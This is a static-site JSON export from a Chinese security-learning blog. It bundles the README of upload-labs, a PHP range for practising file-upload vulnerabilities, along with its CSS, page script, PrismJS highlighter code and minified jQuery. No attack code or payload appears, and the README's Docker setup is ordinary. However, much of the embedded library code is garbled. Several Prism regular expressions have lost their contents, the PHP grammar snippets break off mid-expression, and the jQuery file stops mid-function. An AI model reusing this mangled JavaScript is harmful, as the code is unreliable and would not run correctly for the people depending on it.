{"meta":{"title":"Knlvre","subtitle":"信息安全成长过程中的一些学习记录","description":null,"author":"Knlvre","url":"https://knlvre.github.io","root":"/knlvre.github.io/"},"pages":[{"title":"Tags","date":"2019-08-19T15:27:00.000Z","updated":"2019-08-19T15:27:55.664Z","comments":true,"path":"archives/index.html","permalink":"https://knlvre.github.io/archives/index.html","excerpt":"","text":""},{"title":"categories","date":"2019-11-27T04:00:48.000Z","updated":"2019-11-27T04:00:48.265Z","comments":true,"path":"categories/index.html","permalink":"https://knlvre.github.io/categories/index.html","excerpt":"","text":""},{"title":"Tags","date":"2019-08-19T15:25:32.489Z","updated":"2019-01-27T15:34:15.894Z","comments":true,"path":"tags/index.html","permalink":"https://knlvre.github.io/tags/index.html","excerpt":"","text":""},{"title":"whoami","date":"2019-11-27T06:44:46.000Z","updated":"2019-11-27T06:46:41.036Z","comments":true,"path":"whoami/index.html","permalink":"https://knlvre.github.io/whoami/index.html","excerpt":"","text":"目前是一名学生 正在努力学习信息安全"},{"title":"","date":"2019-10-24T12:24:54.582Z","updated":"2019-10-20T08:11:33.744Z","comments":true,"path":"img/upload-labs/upload-labs/README.html","permalink":"https://knlvre.github.io/img/upload-labs/upload-labs/README.html","excerpt":"","text":"upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。 0x01 Screenshot1.1 主界面 1.2 每一关 1.3 查看代码 0x02 Install2.1 环境要求若要自己亲自搭建环境，请按照以下配置环境，方可正常运行每个Pass。 配置项 配置 描述 操作系统 Window or Linux 推荐使用Windows，除了Pass-19必须在linux下，其余Pass都可以在Windows上运行 PHP版本 推荐5.2.17 其他版本可能会导致部分Pass无法突破 PHP组件 php_gd2,php_exif 部分Pass依赖这两个组件 中间件 设置Apache以moudel方式连接 2.2 Windows快速搭建项目提供了一个Windows下,按照以上配置要求配置好的集成环境 下载地址：https://github.com/c0ny1/upload-labs/releases 集成环境绿色免安装，解压即可使用。 2.3 Linux快速搭建创建镜像 $ cd upload-labs/docker $ docker build -t upload-labs . 或 $ docker pull c0ny1/upload-labs 创建容器 $ docker run -d -p 80:80 upload-labs:latest 0x03 Summary3.1 靶机包含漏洞类型分类 3.2 如何判断上传漏洞类型? 0x04 Thanks 感谢小小黄做的logo"},{"title":"","date":"2019-10-24T12:24:55.462Z","updated":"2019-10-20T08:11:33.744Z","comments":true,"path":"img/upload-labs/upload-labs/css/index.css","permalink":"https://knlvre.github.io/img/upload-labs/upload-labs/css/index.css","excerpt":"","text":"/** * author: c0ny1 * date: 2018-6-13 * project: https://github.com/c0ny1/upload-labs */ body{ margin: 0 0 0 0; min-width: 1340px;/*防止窗口变小导致页面变形*/ background: #333333; font-family: Lato, \"Helvetica Neue\", Helvetica, Arial, \"Microsoft Yahei\", 微软雅黑, sans-serif; } #head{ width: 100%; margin: 0px auto; margin-bottom: 10px; min-width: 1050px; } #head_menu a{ background: #FFCC00; margin: 10px 10px 10px 10px; padding: 8px; -webkit-border-radius:5px; font-family: 黑体; color: #333333; text-decoration: none; font-size: 13px; font-weight: bold; } #head img{ margin-top: 10px; height: 45px; } #head_menu{ min-width: 250px; margin: 20px 40px 10px 10px; float: right; } ol{ list-style:none; } ol li h3{ font-family:\"Arista2\",helvetica,sans-serif; color: #E05D04; font-size: 18px; } p{ color:#fff; margin: 15px 0px; letter-spacing: 5px; font-size: 14px; } p code { background: #323232; font-size: .8em; padding: 4px; margin-right: 5px; color: #fff55c; -webkit-border-radius:5px; letter-spacing: 0px; } #img{ margin-top:20px; margin-left: 20px; } #main{ border: 1px #ddd; width: 100%; float: left; border: 1px solid #000; padding-top: 20px; padding-bottom: 20px; } #menu{ float: left; width: 10%; padding: 10 10 10 10; min-width: 100px; margin-left: 40px; } #menu ul{ margin: 0 0 0 0; padding: 0 0 0 0; } #menu ul li{ list-style-type:none; text-align: center; margin-bottom: 5px; } #menu ul li a{ color: #FDA162; text-decoration: none; font-size: 16px; padding: 5 30 5 30; } #menu ul li a:hover{ color: #E05D04; background: #252525; -webkit-border-radius:5px; } .a_is_selected{ color: #E05D04; background: #252525; -webkit-border-radius:5px; padding: 5 30 5 30; } #upload_panel{ float: right; width: 78%; min-width: 500px; padding: 10 10 10 10; margin-right: 80px; background: #444444; -webkit-border-radius:5px; } #upload_panel ol{ padding-right: 40px; } #upload_panel a{ text-decoration: none; padding: 0px 0px 1px 0px; color: #fff55c; } #upload_panel a:hover { border-bottom:2px solid #FDA162; } .input_file{ -webkit-border-radius: 5px; background: #323232; border: 0px; } .input_text{ padding: 5px; width: 240px; height: 22px; line-height: 22px; border: 0px; -webkit-border-radius: 5px; color: #888888; background: #323232; } .button{ background: #FFCC00; margin: 10px; padding: 4px; -webkit-border-radius:5px; font-family:黑体; border:0px; } #msg{ color:red; } #img img{ border:1px solid #000; } #footer{ color: #C1C1C1; float: left; background: #222222; width: 100%; line-height: 50px; } #footer a{ text-decoration: none; color: #A5041D; } .mask { width:100%; height:100%; background:rgba(0,0,0,0.6); display:none; position:fixed; _position:absolute; top:0; left:0; z-index:99; } .dialog { min-height:120px; background:#393D48; color:#fff;display:none; position:fixed; top:20%; left:50%; z-index:100; box-shadow:3px 3px 5px #000; -webkit-border-radius: 5px; } .dialog-title { background:#91440F; width:100%; height: 30px; line-height: 30px; text-align: center; -webkit-border-radius: 5px 5px 0px 0px; } .dialog a.close { display:block; width:22px; height:22px; background:url(../img/close.png) center no-repeat #91440F; text-indent:-9999em; margin-right: 10px; margin-top: 5px; } .dialog a.close { position:absolute; top:0; right:0; z-index:101; } .dialog.loading { background:url(../img/loading.gif) center no-repeat #393D48; } .dialog-content { line-height: 20px; padding:22px 10px 10px 10px; border-top: 1px solid #000; -webkit-border-radius: 0px 0px 5px 5px; /*过长文本自动换行*/ word-break: break-all; word-wrap: break-word; }"},{"title":"","date":"2019-10-24T12:24:55.475Z","updated":"2019-10-20T08:11:33.744Z","comments":true,"path":"img/upload-labs/upload-labs/css/prism.css","permalink":"https://knlvre.github.io/img/upload-labs/upload-labs/css/prism.css","excerpt":"","text":"/* PrismJS 1.14.0 http://prismjs.com/download.html#themes=prism-twilight&languages=markup+clike+javascript+markup-templating+php+php-extras&plugins=line-numbers */ /** * prism.js Twilight theme * Based (more or less) on the Twilight theme originally of Textmate fame. * @author Remy Bach */ code[class*=\"language-\"], pre[class*=\"language-\"] { color: white; background: none; font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace; text-align: left; text-shadow: 0 -.1em .2em black; white-space: pre; word-spacing: normal; word-break: normal; word-wrap: normal; line-height: 1.5; -moz-tab-size: 4; -o-tab-size: 4; tab-size: 4; -webkit-hyphens: none; -moz-hyphens: none; -ms-hyphens: none; hyphens: none; } pre[class*=\"language-\"], :not(pre) > code[class*=\"language-\"] { background: hsl(0, 0%, 8%); /* #141414 */ } /* Code blocks */ pre[class*=\"language-\"] { border-radius: .5em; border: .3em solid hsl(0, 0%, 33%); /* #282A2B */ box-shadow: 1px 1px .5em black inset; margin: .5em 0; overflow: auto; padding: 1em; } pre[class*=\"language-\"]::-moz-selection { /* Firefox */ background: hsl(200, 4%, 16%); /* #282A2B */ } pre[class*=\"language-\"]::selection { /* Safari */ background: hsl(200, 4%, 16%); /* #282A2B */ } /* Text Selection colour */ pre[class*=\"language-\"]::-moz-selection, pre[class*=\"language-\"] ::-moz-selection, code[class*=\"language-\"]::-moz-selection, code[class*=\"language-\"] ::-moz-selection { text-shadow: none; background: hsla(0, 0%, 93%, 0.15); /* #EDEDED */ } pre[class*=\"language-\"]::selection, pre[class*=\"language-\"] ::selection, code[class*=\"language-\"]::selection, code[class*=\"language-\"] ::selection { text-shadow: none; background: hsla(0, 0%, 93%, 0.15); /* #EDEDED */ } /* Inline code */ :not(pre) > code[class*=\"language-\"] { border-radius: .3em; border: .13em solid hsl(0, 0%, 33%); /* #545454 */ box-shadow: 1px 1px .3em -.1em black inset; padding: .15em .2em .05em; white-space: normal; } .token.comment, .token.prolog, .token.doctype, .token.cdata { color: hsl(0, 0%, 47%); /* #777777 */ } .token.punctuation { opacity: .7; } .namespace { opacity: .7; } .token.tag, .token.boolean, .token.number, .token.deleted { color: hsl(14, 58%, 55%); /* #CF6A4C */ } .token.keyword, .token.property, .token.selector, .token.constant, .token.symbol, .token.builtin { color: hsl(53, 89%, 79%); /* #F9EE98 */ } .token.attr-name, .token.attr-value, .token.string, .token.char, .token.operator, .token.entity, .token.url, .language-css .token.string, .style .token.string, .token.variable, .token.inserted { color: hsl(76, 21%, 52%); /* #8F9D6A */ } .token.atrule { color: hsl(218, 22%, 55%); /* #7587A6 */ } .token.regex, .token.important { color: hsl(42, 75%, 65%); /* #E9C062 */ } .token.important, .token.bold { font-weight: bold; } .token.italic { font-style: italic; } .token.entity { cursor: help; } pre[data-line] { padding: 1em 0 1em 3em; position: relative; } /* Markup */ .language-markup .token.tag, .language-markup .token.attr-name, .language-markup .token.punctuation { color: hsl(33, 33%, 52%); /* #AC885B */ } /* Make the tokens sit above the line highlight so the colours don't look faded. */ .token { position: relative; z-index: 1; } .line-highlight { background: hsla(0, 0%, 33%, 0.25); /* #545454 */ background: linear-gradient(to right, hsla(0, 0%, 33%, .1) 70%, hsla(0, 0%, 33%, 0)); /* #545454 */ border-bottom: 1px dashed hsl(0, 0%, 33%); /* #545454 */ border-top: 1px dashed hsl(0, 0%, 33%); /* #545454 */ left: 0; line-height: inherit; margin-top: 0.75em; /* Same as .prism’s padding-top */ padding: inherit 0; pointer-events: none; position: absolute; right: 0; white-space: pre; z-index: 0; } .line-highlight:before, .line-highlight[data-end]:after { background-color: hsl(215, 15%, 59%); /* #8794A6 */ border-radius: 999px; box-shadow: 0 1px white; color: hsl(24, 20%, 95%); /* #F5F2F0 */ content: attr(data-start); font: bold 65%/1.5 sans-serif; left: .6em; min-width: 1em; padding: 0 .5em; position: absolute; text-align: center; text-shadow: none; top: .4em; vertical-align: .3em; } .line-highlight[data-end]:after { bottom: .4em; content: attr(data-end); top: auto; } pre.line-numbers { position: relative; padding-left: 3.8em; counter-reset: linenumber; } pre.line-numbers > code { position: relative; white-space: inherit; } .line-numbers .line-numbers-rows { position: absolute; pointer-events: none; top: 0; font-size: 100%; left: -3.8em; width: 3em; /* works for line-numbers below 1000 lines */ letter-spacing: -1px; border-right: 1px solid #999; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; } .line-numbers-rows > span { pointer-events: none; display: block; counter-increment: linenumber; } .line-numbers-rows > span:before { content: counter(linenumber); color: #999; display: block; padding-right: 0.8em; text-align: right; }"},{"title":"","date":"2019-10-24T12:24:54.897Z","updated":"2019-10-20T08:11:33.752Z","comments":true,"path":"img/upload-labs/upload-labs/js/index.js","permalink":"https://knlvre.github.io/img/upload-labs/upload-labs/js/index.js","excerpt":"","text":"/** * author: c0ny1 * date: 2018-6-13 * project: https://github.com/c0ny1/upload-labs */ function show_code(){ var url = window.location.href; if(url.indexOf(\"?\") != -1){ url = url.split(\"?\")[0]; } var e = document.getElementById(\"show_code\"); if(e == null){ window.location.href=url+\"?action=show_code\"; }else{ window.location.href=url; } } function modify_showcode_name(){ var url = window.location.href; var btn_showcode = document.getElementById(\"handle_code\"); if(url.indexOf('show_code') >= 0){ btn_showcode.innerHTML = \"隐藏源码\"; }else{ btn_showcode.innerHTML = \"显示源码\"; } } function get_prompt(){ $.ajax({ type: 'get', url: \"helper.php?action=get_prompt\", }).success(function(data) { Dialog.open(400,200,data); }).error(function() { Dialog.open(400,150,\"获取提示失败！\"); }); } function clean_upload_file(){ $.ajax({ type: 'get', url: \"../rmdir.php?action=clean_upload_file\", }).success(function(data) { Dialog.open(400,200,data); }).error(function() { Dialog.open(400,150,\"删除失败！\"); }); } function update_copyright_time(){ var mydate = new Date(); var now_time = '2018 ~ ' + mydate.getFullYear(); var copyright_time = document.getElementById(\"copyright_time\"); copyright_time.innerHTML = now_time; } function setFooter(){ var min_height = window.innerHeight - 175; var obj = document.getElementById(\"main\"); obj.style.minHeight= min_height; } var Dialog = { mask: $('.mask'), dialog: $('.dialog'), content: $('.dialog-content'), open: function (width, height, appendHtml) { Dialog.mask.fadeIn(500); Dialog.dialog.css({ width: width, height: (height + 22), marginLeft: -(parseInt(width) / 2) }).addClass('loading').fadeIn(500, function () { Dialog.dialog.removeClass('loading'); Dialog.content.append(appendHtml); }); }, close: function () { Dialog.mask.fadeOut(500); Dialog.dialog.fadeOut(500, function () { Dialog.content.empty(); }); } } $(function(){ //修改显示源码按钮名称 modify_showcode_name(); //更新版权时间 update_copyright_time(); //设置footer用于在底部 setFooter(); window.onresize = function(){ setFooter(); } //设置当前所在栏目的菜单按钮按下效果 var path = window.location.pathname; var pass_id = path.match(/Pass-\\d{2}/i); $(\"#\"+pass_id).addClass('a_is_selected'); //给弹出框绑定关闭事件 $('.dialog').find('a.close').bind(\"click\", function () { Dialog.close(); }); });"},{"title":"","date":"2019-10-24T12:24:54.910Z","updated":"2019-10-20T08:11:33.752Z","comments":true,"path":"img/upload-labs/upload-labs/js/prism-php.min.js","permalink":"https://knlvre.github.io/img/upload-labs/upload-labs/js/prism-php.min.js","excerpt":"","text":"!function(e){e.languages.php=e.languages.extend(\"clike\",{keyword:/\\b(?:and|or|xor|array|as|break|case|cfunction|class|const|continue|declare|default|die|do|else|elseif|enddeclare|endfor|endforeach|endif|endswitch|endwhile|extends|for|foreach|function|include|include_once|global|if|new|return|static|switch|use|require|require_once|var|while|abstract|interface|public|implements|private|protected|parent|throw|null|echo|print|trait|namespace|final|yield|goto|instanceof|finally|try|catch)\\b/i,constant:/\\b[A-Z0-9_]{2,}\\b/,comment:{pattern:/(^|[^\\\\])(?:\\/\\*[\\s\\S]*?\\*\\/|\\/\\/.*)/,lookbehind:!0}}),e.languages.insertBefore(\"php\",\"string\",{\"shell-comment\":{pattern:/(^|[^\\\\])#.*/,lookbehind:!0,alias:\"comment\"}}),e.languages.insertBefore(\"php\",\"keyword\",{delimiter:{pattern:/\\?>|)[\\w]+/,lookbehind:!0}}),e.languages.insertBefore(\"php\",\"string\",{\"nowdoc-string\":{pattern:/"},{"title":"","date":"2019-10-24T12:24:54.872Z","updated":"2019-10-20T08:11:33.752Z","comments":true,"path":"img/upload-labs/upload-labs/js/prism-line-numbers.min.js","permalink":"https://knlvre.github.io/img/upload-labs/upload-labs/js/prism-line-numbers.min.js","excerpt":"","text":"!function(){if(\"undefined\"!=typeof self&&self.Prism&&self.document){var e=\"line-numbers\",t=/\\n(?!$)/g,n=function(e){var n=r(e),s=n[\"white-space\"];if(\"pre-wrap\"===s||\"pre-line\"===s){var l=e.querySelector(\"code\"),i=e.querySelector(\".line-numbers-rows\"),a=e.querySelector(\".line-numbers-sizer\"),o=l.textContent.split(t);a||(a=document.createElement(\"span\"),a.className=\"line-numbers-sizer\",l.appendChild(a)),a.style.display=\"block\",o.forEach(function(e,t){a.textContent=e||\"\\n\";var n=a.getBoundingClientRect().height;i.children[t].style.height=n+\"px\"}),a.textContent=\"\",a.style.display=\"none\"}},r=function(e){return e?window.getComputedStyle?getComputedStyle(e):e.currentStyle||null:null};window.addEventListener(\"resize\",function(){Array.prototype.forEach.call(document.querySelectorAll(\"pre.\"+e),n)}),Prism.hooks.add(\"complete\",function(e){if(e.code){var r=e.element.parentNode,s=/\\s*\\bline-numbers\\b\\s*/;if(r&&/pre/i.test(r.nodeName)&&(s.test(r.className)||s.test(e.element.className))&&!e.element.querySelector(\".line-numbers-rows\")){s.test(e.element.className)&&(e.element.className=e.element.className.replace(s,\" \")),s.test(r.className)||(r.className+=\" line-numbers\");var l,i=e.code.match(t),a=i?i.length+1:1,o=new Array(a+1);o=o.join(\"\"),l=document.createElement(\"span\"),l.setAttribute(\"aria-hidden\",\"true\"),l.className=\"line-numbers-rows\",l.innerHTML=o,r.hasAttribute(\"data-start\")&&(r.style.counterReset=\"linenumber \"+(parseInt(r.getAttribute(\"data-start\"),10)-1)),e.element.appendChild(l),n(r),Prism.hooks.run(\"line-numbers\",e)}}}),Prism.hooks.add(\"line-numbers\",function(e){e.plugins=e.plugins||{},e.plugins.lineNumbers=!0}),Prism.plugins.lineNumbers={getLine:function(t,n){if(\"PRE\"===t.tagName&&t.classList.contains(e)){var r=t.querySelector(\".line-numbers-rows\"),s=parseInt(t.getAttribute(\"data-start\"),10)||1,l=s+(r.children.length-1);s>n&&(n=s),n>l&&(n=l);var i=n-s;return r.children[i]}}}}}();"},{"title":"","date":"2019-10-24T12:24:54.884Z","updated":"2019-10-20T08:11:33.752Z","comments":true,"path":"img/upload-labs/upload-labs/js/prism.js","permalink":"https://knlvre.github.io/img/upload-labs/upload-labs/js/prism.js","excerpt":"","text":"/* PrismJS 1.15.0 https://prismjs.com/download.html#themes=prism&languages=markup+clike+javascript+markup-templating+php */ var _self=\"undefined\"!=typeof window?window:\"undefined\"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?self:{},Prism=function(){var e=/\\blang(?:uage)?-([\\w-]+)\\b/i,t=0,n=_self.Prism={manual:_self.Prism&&_self.Prism.manual,disableWorkerMessageHandler:_self.Prism&&_self.Prism.disableWorkerMessageHandler,util:{encode:function(e){return e instanceof r?new r(e.type,n.util.encode(e.content),e.alias):\"Array\"===n.util.type(e)?e.map(n.util.encode):e.replace(/&/g,\"&amp;\").replace(/e.length)return;if(!(w instanceof s)){if(m&&b!=t.length-1){h.lastIndex=k;var _=h.exec(e);if(!_)break;for(var j=_.index+(d?_[1].length:0),P=_.index+_[0].length,A=b,x=k,O=t.length;O>A&&(P>x||!t[A].type&&!t[A-1].greedy);++A)x+=t[A].length,j>=x&&(++b,k=x);if(t[b]instanceof s)continue;I=A-b,w=e.slice(k,x),_.index-=k}else{h.lastIndex=0;var _=h.exec(w),I=1}if(_){d&&(p=_[1]?_[1].length:0);var j=_.index+p,_=_[0].slice(p),P=j+_.length,N=w.slice(0,j),S=w.slice(P),C=[b,I];N&&(++b,k+=N.length,C.push(N));var E=new s(u,f?n.tokenize(_,f):_,y,_,m);if(C.push(E),S&&C.push(S),Array.prototype.splice.apply(t,C),1!=I&&n.matchGrammar(e,t,r,b,k,!0,u),i)break}else if(i)break}}}}},tokenize:function(e,t){var r=[e],a=t.rest;if(a){for(var l in a)t[l]=a[l];delete t.rest}return n.matchGrammar(e,r,t,0,0,!1),r},hooks:{all:{},add:function(e,t){var r=n.hooks.all;r[e]=r[e]||[],r[e].push(t)},run:function(e,t){var r=n.hooks.all[e];if(r&&r.length)for(var a,l=0;a=r[l++];)a(t)}}},r=n.Token=function(e,t,n,r,a){this.type=e,this.content=t,this.alias=n,this.length=0|(r||\"\").length,this.greedy=!!a};if(r.stringify=function(e,t,a){if(\"string\"==typeof e)return e;if(\"Array\"===n.util.type(e))return e.map(function(n){return r.stringify(n,t,e)}).join(\"\");var l={type:e.type,content:r.stringify(e.content,t,a),tag:\"span\",classes:[\"token\",e.type],attributes:{},language:t,parent:a};if(e.alias){var i=\"Array\"===n.util.type(e.alias)?e.alias:[e.alias];Array.prototype.push.apply(l.classes,i)}n.hooks.run(\"wrap\",l);var o=Object.keys(l.attributes).map(function(e){return e+'=\"'+(l.attributes[e]||\"\").replace(/\"/g,\"&quot;\")+'\"'}).join(\" \");return\"\"+l.content+\"\"},!_self.document)return _self.addEventListener?(n.disableWorkerMessageHandler||_self.addEventListener(\"message\",function(e){var t=JSON.parse(e.data),r=t.language,a=t.code,l=t.immediateClose;_self.postMessage(n.highlight(a,n.languages[r],r)),l&&_self.close()},!1),_self.Prism):_self.Prism;var a=document.currentScript||[].slice.call(document.getElementsByTagName(\"script\")).pop();return a&&(n.filename=a.src,n.manual||a.hasAttribute(\"data-manual\")||(\"loading\"!==document.readyState?window.requestAnimationFrame?window.requestAnimationFrame(n.highlightAll):window.setTimeout(n.highlightAll,16):document.addEventListener(\"DOMContentLoaded\",n.highlightAll))),_self.Prism}();\"undefined\"!=typeof module&&module.exports&&(module.exports=Prism),\"undefined\"!=typeof global&&(global.Prism=Prism); Prism.languages.markup={comment://,prolog://,doctype://i,cdata://i,tag:{pattern:/\\/=$\\/=]+(?:=(?:(\"|')(?:\\\\[\\s\\S]|(?!\\1)[^\\\\])*\\1|[^\\s'\">=]+))?)*\\s*\\/?>/i,greedy:!0,inside:{tag:{pattern:/^\\/]+/i,inside:{punctuation:/^\\/:]+:/}},\"attr-value\":{pattern:/=(?:(\"|')(?:\\\\[\\s\\S]|(?!\\1)[^\\\\])*\\1|[^\\s'\">=]+)/i,inside:{punctuation:[/^=/,{pattern:/(^|[^\\\\])[\"']/,lookbehind:!0}]}},punctuation:/\\/?>/,\"attr-name\":{pattern:/[^\\s>\\/]+/,inside:{namespace:/^[^\\s>\\/:]+:/}}}},entity:/&#?[\\da-z]{1,8};/i},Prism.languages.markup.tag.inside[\"attr-value\"].inside.entity=Prism.languages.markup.entity,Prism.hooks.add(\"wrap\",function(a){\"entity\"===a.type&&(a.attributes.title=a.content.replace(/&amp;/,\"&\"))}),Prism.languages.xml=Prism.languages.markup,Prism.languages.html=Prism.languages.markup,Prism.languages.mathml=Prism.languages.markup,Prism.languages.svg=Prism.languages.markup; Prism.languages.clike={comment:[{pattern:/(^|[^\\\\])\\/\\*[\\s\\S]*?(?:\\*\\/|$)/,lookbehind:!0},{pattern:/(^|[^\\\\:])\\/\\/.*/,lookbehind:!0,greedy:!0}],string:{pattern:/([\"'])(?:\\\\(?:\\r\\n|[\\s\\S])|(?!\\1)[^\\\\\\r\\n])*\\1/,greedy:!0},\"class-name\":{pattern:/((?:\\b(?:class|interface|extends|implements|trait|instanceof|new)\\s+)|(?:catch\\s+\\())[\\w.\\\\]+/i,lookbehind:!0,inside:{punctuation:/[.\\\\]/}},keyword:/\\b(?:if|else|while|do|for|return|in|instanceof|function|new|try|throw|catch|finally|null|break|continue)\\b/,\"boolean\":/\\b(?:true|false)\\b/,\"function\":/[a-z0-9_]+(?=\\()/i,number:/\\b0x[\\da-f]+\\b|(?:\\b\\d+\\.?\\d*|\\B\\.\\d+)(?:e[+-]?\\d+)?/i,operator:/--?|\\+\\+?|!=?=?|=?|==?=?|&&?|\\|\\|?|\\?|\\*|\\/|~|\\^|%/,punctuation:/[{}[\\];(),.:]/}; Prism.languages.javascript=Prism.languages.extend(\"clike\",{keyword:/\\b(?:as|async|await|break|case|catch|class|const|continue|debugger|default|delete|do|else|enum|export|extends|finally|for|from|function|get|if|implements|import|in|instanceof|interface|let|new|null|of|package|private|protected|public|return|set|static|super|switch|this|throw|try|typeof|var|void|while|with|yield)\\b/,number:/\\b(?:0[xX][\\dA-Fa-f]+|0[bB][01]+|0[oO][0-7]+|NaN|Infinity)\\b|(?:\\b\\d+\\.?\\d*|\\B\\.\\d+)(?:[Ee][+-]?\\d+)?/,\"function\":/[_$a-z\\xA0-\\uFFFF][$\\w\\xA0-\\uFFFF]*(?=\\s*\\()/i,operator:/-[-=]?|\\+[+=]?|!=?=?|?>?=?|=(?:==?|>)?|&[&=]?|\\|[|=]?|\\*\\*?=?|\\/=?|~|\\^=?|%=?|\\?|\\.{3}/}),Prism.languages.insertBefore(\"javascript\",\"keyword\",{regex:{pattern:/((?:^|[^$\\w\\xA0-\\uFFFF.\"'\\])\\s])\\s*)\\/(\\[[^\\]\\r\\n]+]|\\\\.|[^\\/\\\\\\[\\r\\n])+\\/[gimyu]{0,5}(?=\\s*($|[\\r\\n,.;})\\]]))/,lookbehind:!0,greedy:!0},\"function-variable\":{pattern:/[_$a-z\\xA0-\\uFFFF][$\\w\\xA0-\\uFFFF]*(?=\\s*=\\s*(?:function\\b|(?:\\([^()]*\\)|[_$a-z\\xA0-\\uFFFF][$\\w\\xA0-\\uFFFF]*)\\s*=>))/i,alias:\"function\"},constant:/\\b[A-Z][A-Z\\d_]*\\b/}),Prism.languages.insertBefore(\"javascript\",\"string\",{\"template-string\":{pattern:/`(?:\\\\[\\s\\S]|\\${[^}]+}|[^\\\\`])*`/,greedy:!0,inside:{interpolation:{pattern:/\\${[^}]+}/,inside:{\"interpolation-punctuation\":{pattern:/^\\${|}$/,alias:\"punctuation\"},rest:null}},string:/[\\s\\S]+/}}}),Prism.languages.javascript[\"template-string\"].inside.interpolation.inside.rest=Prism.languages.javascript,Prism.languages.markup&&Prism.languages.insertBefore(\"markup\",\"tag\",{script:{pattern:/()[\\s\\S]*?(?=)/i,lookbehind:!0,inside:Prism.languages.javascript,alias:\"language-javascript\",greedy:!0}}),Prism.languages.js=Prism.languages.javascript; Prism.languages[\"markup-templating\"]={},Object.defineProperties(Prism.languages[\"markup-templating\"],{buildPlaceholders:{value:function(e,t,n,a){e.language===t&&(e.tokenStack=[],e.code=e.code.replace(n,function(n){if(\"function\"==typeof a&&!a(n))return n;for(var r=e.tokenStack.length;-1!==e.code.indexOf(\"___\"+t.toUpperCase()+r+\"___\");)++r;return e.tokenStack[r]=n,\"___\"+t.toUpperCase()+r+\"___\"}),e.grammar=Prism.languages.markup)}},tokenizePlaceholders:{value:function(e,t){if(e.language===t&&e.tokenStack){e.grammar=Prism.languages[t];var n=0,a=Object.keys(e.tokenStack),r=function(o){if(!(n>=a.length))for(var i=0;i-1){++n;var f,u=l.substring(0,p),_=new Prism.Token(t,Prism.tokenize(s,e.grammar,t),\"language-\"+t,s),k=l.substring(p+(\"___\"+t.toUpperCase()+c+\"___\").length);if(u||k?(f=[u,_,k].filter(function(e){return!!e}),r(f)):f=_,\"string\"==typeof g?Array.prototype.splice.apply(o,[i,1].concat(f)):g.content=f,n>=a.length)break}}else g.content&&\"string\"!=typeof g.content&&r(g.content)}};r(e.tokens)}}}}); !function(e){e.languages.php=e.languages.extend(\"clike\",{keyword:/\\b(?:and|or|xor|array|as|break|case|cfunction|class|const|continue|declare|default|die|do|else|elseif|enddeclare|endfor|endforeach|endif|endswitch|endwhile|extends|for|foreach|function|include|include_once|global|if|new|return|static|switch|use|require|require_once|var|while|abstract|interface|public|implements|private|protected|parent|throw|null|echo|print|trait|namespace|final|yield|goto|instanceof|finally|try|catch)\\b/i,constant:/\\b[A-Z0-9_]{2,}\\b/,comment:{pattern:/(^|[^\\\\])(?:\\/\\*[\\s\\S]*?\\*\\/|\\/\\/.*)/,lookbehind:!0}}),e.languages.insertBefore(\"php\",\"string\",{\"shell-comment\":{pattern:/(^|[^\\\\])#.*/,lookbehind:!0,alias:\"comment\"}}),e.languages.insertBefore(\"php\",\"keyword\",{delimiter:{pattern:/\\?>|)[\\w]+/,lookbehind:!0}}),e.languages.insertBefore(\"php\",\"string\",{\"nowdoc-string\":{pattern:/"},{"title":"","date":"2019-10-24T12:24:54.926Z","updated":"2019-10-20T08:11:33.752Z","comments":true,"path":"img/upload-labs/upload-labs/js/jquery.min.js","permalink":"https://knlvre.github.io/img/upload-labs/upload-labs/js/jquery.min.js","excerpt":"","text":"/*! jQuery v1.10.2 | (c) 2005, 2013 jQuery Foundation, Inc. | jquery.org/license //@ sourceMappingURL=jquery.min.map */ (function(e,t){var n,r,i=typeof t,o=e.location,a=e.document,s=a.documentElement,l=e.jQuery,u=e.$,c={},p=[],f=\"1.10.2\",d=p.concat,h=p.push,g=p.slice,m=p.indexOf,y=c.toString,v=c.hasOwnProperty,b=f.trim,x=function(e,t){return new x.fn.init(e,t,r)},w=/[+-]?(?:\\d*\\.|)\\d+(?:[eE][+-]?\\d+|)/.source,T=/\\S+/g,C=/^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g,N=/^(?:\\s*()[^>]*|#([\\w-]*))$/,k=/^(?:|)$/,E=/^[\\],:{}\\s]*$/,S=/(?:^|:|,)(?:\\s*\\[)+/g,A=/\\\\(?:[\"\\\\\\/bfnrt]|u[\\da-fA-F]{4})/g,j=/\"[^\"\\\\\\r\\n]*\"|true|false|null|-?(?:\\d+\\.|)\\d+(?:[eE][+-]?\\d+|)/g,D=/^-ms-/,L=/-([\\da-z])/gi,H=function(e,t){return t.toUpperCase()},q=function(e){(a.addEventListener||\"load\"===e.type||\"complete\"===a.readyState)&&(_(),x.ready())},_=function(){a.addEventListener?(a.removeEventListener(\"DOMContentLoaded\",q,!1),e.removeEventListener(\"load\",q,!1)):(a.detachEvent(\"onreadystatechange\",q),e.detachEvent(\"onload\",q))};x.fn=x.prototype={jquery:f,constructor:x,init:function(e,n,r){var i,o;if(!e)return this;if(\"string\"==typeof e){if(i=\"\"===e.charAt(e.length-1)&&e.length>=3?[null,e,null]:N.exec(e),!i||!i[1]&&n)return!n||n.jquery?(n||r).find(e):this.constructor(n).find(e);if(i[1]){if(n=n instanceof x?n[0]:n,x.merge(this,x.parseHTML(i[1],n&&n.nodeType?n.ownerDocument||n:a,!0)),k.test(i[1])&&x.isPlainObject(n))for(i in n)x.isFunction(this[i])?this[i](n[i]):this.attr(i,n[i]);return this}if(o=a.getElementById(i[2]),o&&o.parentNode){if(o.id!==i[2])return r.find(e);this.length=1,this[0]=o}return this.context=a,this.selector=e,this}return e.nodeType?(this.context=this[0]=e,this.length=1,this):x.isFunction(e)?r.ready(e):(e.selector!==t&&(this.selector=e.selector,this.context=e.context),x.makeArray(e,this))},selector:\"\",length:0,toArray:function(){return g.call(this)},get:function(e){return null==e?this.toArray():0>e?this[this.length+e]:this[e]},pushStack:function(e){var t=x.merge(this.constructor(),e);return t.prevObject=this,t.context=this.context,t},each:function(e,t){return x.each(this,e,t)},ready:function(e){return x.ready.promise().done(e),this},slice:function(){return this.pushStack(g.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(0>e?t:0);return this.pushStack(n>=0&&t>n?[this[n]]:[])},map:function(e){return 